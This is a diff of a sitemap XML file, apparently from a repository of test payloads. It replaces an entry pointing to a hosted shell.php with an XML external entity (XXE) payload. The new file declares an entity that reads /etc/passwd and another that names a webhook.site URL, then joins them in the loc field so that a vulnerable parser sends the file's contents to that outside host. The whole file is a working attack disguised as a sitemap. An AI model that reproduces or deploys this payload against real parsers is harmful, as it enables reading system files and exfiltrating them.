@@ -1,7 +1,14 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
-	<url>
-		<loc>https://raw.githubusercontent.com/hiepck/test-payload/main/xml/shell.php</loc>
-		<lastmod>2017-06-14T19:55:25+02:00</lastmod>
-	</url>
+<!DOCTYPE urlset [
+<!ENTITY test "https://webhook.site/7b02ae7d-04b1-416d-b7e0-26a61298ef20"> 
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+    xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
+<url>
+    <loc>&test;?&file;</loc>
+    <lastmod>2019-06-19</lastmod>
+    <changefreq>daily</changefreq>
+</url>
 </urlset>
